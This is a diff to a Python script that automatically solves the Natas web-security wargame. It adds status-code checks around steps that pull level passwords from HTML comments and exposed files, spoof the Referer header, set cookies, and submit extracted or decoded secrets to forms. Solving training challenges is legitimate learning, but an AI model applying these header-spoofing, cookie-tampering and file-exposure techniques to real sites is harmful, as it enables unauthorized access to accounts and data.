@@ -82,7 +82,8 @@ while True:
                 "/",
                 "<!--The password for natas[12] is (\w+) -->"
             )
-            
+
+            if res.status != 200: continue           
             if reg:
                 if len(passwords) == level + 1: passwords.append(reg[1])
                 print(" Password found: {}".format(passwords[level + 1]))
@@ -94,6 +95,7 @@ while True:
             
             print(" Search password in file {}".format(f))
             res, reg = rex("GET", f, "natas[34]:(\w+)")
+            if res.status != 200: continue
             if reg:
                 if len(passwords) == level + 1: passwords.append(reg[1])
                 print(" Password found: {}".format(passwords[level + 1]))
@@ -109,6 +111,7 @@ while True:
                 headers={"Referer": r}
             )
 
+            if res.status != 200: continue
             if reg:
                 if len(passwords) == level + 1: passwords.append(reg[1])
                 print(" Password found: {}".format(passwords[level + 1]))
@@ -123,7 +126,8 @@ while True:
                 "The password for natas6 is (\w+)",
                 headers={"Cookie": c}
             )
-            
+
+            if res.status != 200: continue
             if reg:
                 if len(passwords) == level + 1: passwords.append(reg[1])
                 print(" Password found: {}".format(passwords[level + 1]))
@@ -133,6 +137,7 @@ while True:
             f = "/includes/secret.inc"
             print(" Search secret in file {}: ".format(f))
             res, reg = rex("GET", f, "\$secret = \"(\w+)\";")
+            if res.status != 200: continue
             if reg:
                 print(" Post form with secret {}".format(reg[1]))
                 res, reg = rex(
@@ -143,7 +148,7 @@ while True:
                     body="secret={}&submit=submit".format(reg[1])
                 )
 
- 
+                if res.status != 200: continue
                 if reg:
                     if len(passwords) == level + 1: passwords.append(reg[1])
                     print(" Password found: {}".format(passwords[level + 1]))
@@ -159,7 +164,8 @@ while True:
                 u,
                 "<br>\n<br>\n(\w+)\n",
             )
-            
+
+            if res.status != 200: continue
             if reg:
                 if len(passwords) == level + 1: passwords.append(reg[1])
                 print(" Password found: {}".format(passwords[level + 1]))
@@ -173,7 +179,8 @@ while True:
                 f,
                 "\$encodedSecret&nbsp;=&nbsp;\"(\w+)\";",
             )
-            
+
+            if res.status != 200: continue
             if reg:
                 s = reg[1]
                 print(" Decoding secret {}".format(s))
@@ -187,6 +194,7 @@ while True:
                     body="secret={}&submit=submit".format(s),
                 )
 
+                if res.status != 200: continue
                 if reg:
                     if len(passwords) == level + 1: passwords.append(reg[1])
                     print(" Password found: {}".format(passwords[level + 1]))
@@ -203,6 +211,7 @@ while True:
                 "<pre>\n(\w+)\n</pre>",
             )
 
+            if res.status != 200: continue
             if reg:
                 if len(passwords) == level + 1: passwords.append(reg[1])
                 print(" Password found: {}".format(passwords[level + 1]))
